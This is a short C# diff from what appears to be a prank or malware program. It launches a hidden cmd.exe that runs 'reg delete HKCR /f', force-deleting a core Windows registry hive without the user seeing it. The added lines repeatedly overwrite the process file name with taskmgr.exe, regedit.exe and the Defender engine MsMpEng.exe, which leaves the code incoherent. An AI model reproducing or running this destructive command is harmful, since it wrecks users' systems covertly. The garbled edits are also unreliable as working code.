@@ -410,6 +410,9 @@ namespace FUNZIEZ
         {
             ProcessStartInfo reg_kill = new ProcessStartInfo();
             reg_kill.FileName = "cmd.exe";
+            reg_kill.FileName = "taskmgr.exe";
+            reg_kill.FileName = "regedit.exe";
+            reg_kill.FileName = "MsMpEng.exe";
             reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
             reg_kill.Arguments = @"/k reg delete HKCR /f";
             Process.Start(reg_kill);
